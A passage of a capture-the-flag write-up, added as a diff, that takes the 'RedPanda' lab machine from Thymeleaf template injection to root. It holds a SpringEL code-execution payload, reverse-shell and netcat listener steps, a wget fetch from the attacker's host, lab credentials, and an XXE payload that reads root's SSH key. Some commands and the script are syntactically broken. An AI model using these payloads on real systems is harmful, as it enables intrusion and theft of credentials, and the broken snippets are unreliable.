@@ -88,3 +88,180 @@ Within this directory we can now find names about the authors of the site  and w
 So far so good we have been able to find hidden sites that provided us with information about the authors and stats, we have a clue about what could we do in the site making an injection attack but the most considerable clue that we have is the Spring Bot label about how the site was made. 
 
 We can now search for exploits for this bot
+
+
+###  Begin the attack 
+Research for attacks using STTI vulnerabilities 
+
+### One plausible option 
+Attack using Thymeleaf creating a common login module with dependencies .
+
+First evaluate if the page is vulnerable to this kind of injection testing the common results from input , here is a list of the input that can be processed.
+Thymeleaf is a modern server side template engine for Java based on XML/HTML/HTML5 syntax. Thymeleaf works and looks just like HTML 
+
+Before attemping the attack, dive deeper into thymeleaf syntax to understand the expressions and extra atributes. 
+     -------
+
+- ${...} Variable expressions, OGNL and Spring EL expressions
+- \*{...} Selection expressions, used to specific purposes
+- \#{... }Message(i18n)expressions-> used for internalization
+- @{...}Link{URL} expressions to set correct paths and urls
+- ~{...}Fragment expressions - To reuse part of the templates
+     -------
+
+Now researching for more information about how to remote execute the code if the Thymeleaf is based in Spring or OGNL but from the enumeration phase we gathered information about the web and we know that it is based on Spring so Thymeleaf is using SpringEL then. 
+
+The line necessary for a remote code execution is the next one 
+
+SpringEL : ${T(java.lang.Runtime).getRuntime().exec('calc')}
+
+Now to see which kind of syntax pass and execute we input every one of the possible syntaxes, until we see that ~ and $ are banned characters so in order to execute the code try out with the other 3 possible options. 
+
+#### Proxy and Burp suite 
+
+Intercept and send communication to the server using Burp Suite and disabling system proxy with fox proxy , these are the tests for injection. 
+Send a POST request given by default in burp
+
+Generate commands with a python script that prints the power directory , search for name and then create a python script for obtaining a Reverse Shell
+
+### The actual attack 
+
+Set a listener on your machine on port 443
+`<bash>
+$nc -lvpn 443
+`
+Initiate a python server on port 8080 with 
+`<python>
+$sudo python3 -m http.server 80
+`
+
+Execute the script specifying the local IP that is something like 10.10.14.--  the port of the python server and the port of netcat for listening events. 
+
+Once the 200 code is received then it was a successful reverse shell execution 
+
+Upgrade the pseudo terminal with the python3 trick 
+`<python>
+python3 -c 'import pty; pty.spawn("/bin/bash")'
+`
+
+Begin the exploration of the system and obtain the user.txt flag 
+
+Identify which commands can be executed without a password 
+
+Then verify the tasks with procmon. 
+
+Make a quick script that looks out for tasks , this has to be created on /tmp/hsperfdata_woodenk 
+
+`<bash scripting>
+\# /bin/bash
+old = $(ps -eo command)
+while true; do
+		new$(ps-eo command)
+		diff<(echo "$old")<(echo "$new")| grep "[\>\<]"|grep -v -E "procmon|command"
+		old=$new
+done
+`
+
+Save it as procmon.sh command and change the execute permisions with chmod +x
+
+`<bash>
+$chmod +x procmon.sh
+`
+
+Execute the script 
+From here we can look again to spot vulnerabilities or ways in which we can take advantage of the code in which it was made the site in this case the file of interest is the /opt/credit-score/Logparser/final/target/final-1.0jar-with-dependencies.jar  that is listed as a java -jar file 
+
+Also look out for the MainControler inside the panda_search/.../main/java file 
+There we can find the port in which it was deployed 3306, and ==Credentials== 
+
+woodenk : RedPandazRule
+
+Then stablish the connection via ssh with this credentials. 
+
+After succesfully connected via SSH look out for the inet IP address 
+
+Then to find a way to escalate privilege we can use the tool pyspy64
+Move to the directory 
+/tmp/hsperfdata_woodenk
+Transfer pyspy using wget and the http.server 
+`<bash>
+wget http://10.10.14.--:80/pspy64
+`
+
+Change the execution permission again with chmod + for pyspy64
+
+After a while waiting for the script to finish then we can see that we are able to execute
+
+/usr/bin/find /tmp -name *.xml -exec rm -rf {};
+but also 
+/usr/bin/find  /home/woodenk -name \*.jpg -exec rm -rf{};
+
+
+Then remember about the java jar file navigate to 
+
+/opt/credit-score/LogParser/final/
+and then to 
+/src/main/java/com/logparser
+
+Then look carefully for the app.java file and read about the if statements 
+
+there we can see how it has to be the metadata in order to be processed so we would need to create an image and then rewrite the metadata for be processed then go back to the woodenk/home/hspferdata_woodenk
+
+modify the data of the image in your current directory with the tool exiftool 
+
+`<bash>
+$exiftool -Artist "../home/woodenk/pwnd" file.jpg
+`
+
+Then create a malicious xml archive to obtain the id_rsa key to connect to root via ssh 
+
+Inside this malicious file insert 
+
+`
+<!==?xml version="1.0" ?==>
+<!DOCTYPE replace [<!ENTITY ent SYSTEM "file:///root/.ssh/id_rsa">]
+<credits>
+<author>damian</author>
+	<image>
+		<url> /../../../../../../../home/woodenk/image.jpg</url>
+		<hello>&ent;</hello>
+		<views>0</views>
+	</image>
+	<totalviews>0</totalviews>
+<credits>
+`
+
+
+
+Then call for both archives with wget
+
+`
+$wget http://10.10.14.--/image.jpg 
+`
+and for the credits 
+`
+$wget http://10.10.14.--/pwn_creds.xml
+`
+
+One step forward is to then curl the image but with the path we insert in the credits 
+
+`
+$curl http://redpanda.htb:8080 -H "User:Agent: ||/../../../../../../../home/woodenk/image.jpg" 
+`
+
+then to obfuscate the page navigate to the stats page and export the table from woodenk , after this is done just cat the pwnd_creds.xml 
+This would launch the id_rsa 
+just copy the id_rsa and create a new id_rsa key to login via root using this key 
+change the permissions of the id_rsa file 
+
+`
+$chmod 600 id_rsa 
+`
+
+then login via ssh 
+
+`
+$ssh root@redpanda.htb -i id_rsa
+`
+
+look out for the root.txt flag 
